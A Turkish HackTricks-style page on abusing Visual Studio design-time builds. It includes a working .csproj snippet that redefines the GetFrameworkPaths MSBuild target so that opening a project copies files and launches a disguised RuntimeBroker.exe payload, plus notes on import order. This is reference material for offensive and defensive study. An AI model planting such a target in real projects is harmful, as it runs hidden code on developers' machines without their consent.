# Visual Studio Projesi Tasarım Zamanı MSBuild Yürütmesi

{{#include ../banners/hacktricks-training.md}}

Visual Studio'da bir C# projesini açmak pasif bir okuma işlemi değildir. Tasarım zamanı derlemesi, geliştirici Build veya Run'ı seçmeden önce IntelliSense'i, başvuruları ve hata ayıklamayı başlatmak için adlandırılmış MSBuild hedeflerini çağırır. `GetFrameworkPaths` bu hedeflerden biridir. Bu hedefi yeniden tanımlayan bir proje, ayrı bir payload tıklaması olmadan proje yükleme işlemiyle kullanıcı bağlamında kod yürütülmesini sağlayabilir.<sup>[[1]](#references)[[2]](#references)</sup>

Bildirilen proje, kaynak dosyalarını tanımladıktan sonra yan yana bulunan bir payload'ı hazırlamak ve başlatmak için değiştirilmiş hedefinde `MakeDir`, `Copy` ve `Exec` kullandı. Bu sadeleştirilmiş örnek, kaynağın Figure 6'sında gösterilen yürütme yolunu korur; bağımsız bir XML dosyasına değil, bir `.csproj` dosyasının içine yerleştirilmelidir.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Import sırası önemlidir:** MSBuild, bir hedefin *son* tanımını kullanır. Bir proje dosyasında yazılan hedefin, daha sonraki bir içe aktarma işlemi yeniden tanımlarsa Microsoft hedefinin yerini alacağı garanti değildir. `<Project Sdk="...">` kullanan SDK tarzı projeler, SDK hedeflerini proje gövdesinden sonra örtük olarak içe aktarır; bu nedenle her projede bu geçersiz kılmanın işe yarayacağını varsaymak yerine değerlendirilen içe aktarma sırasını inceleyin. `MSBuild.exe -preprocess:expanded.xml project.csproj` komutu, projeyi derlemeden içe aktarımları genişletir ve etkin hedef tanımını bulmaya yardımcı olabilir.<sup>[[3]](#references)[[4]](#references)</sup>

Bu, geliştirici projelerindeki bir yürütme yüzeyidir; VSIX uzantısı kurulumu değildir ve tek başına ayrıcalık yükseltme sağlamaz. Hazırlanan yürütülebilir dosya kötü amaçlı bir bitişik `.exe.config` veya DLL kullanıyorsa [AppDomainManager hijacking and DLL sideloading](windows-local-privilege-escalation/dll-hijacking/) konusuna geçin.

## References

- [1] [Unit 42 - Blinder Tunnel Kampanyası Irak Altyapısını Hedef Alıyor](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Visual Studio Entegrasyonu (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild Hedefleri](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - MSBuild Komut Satırı Başvurusu](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
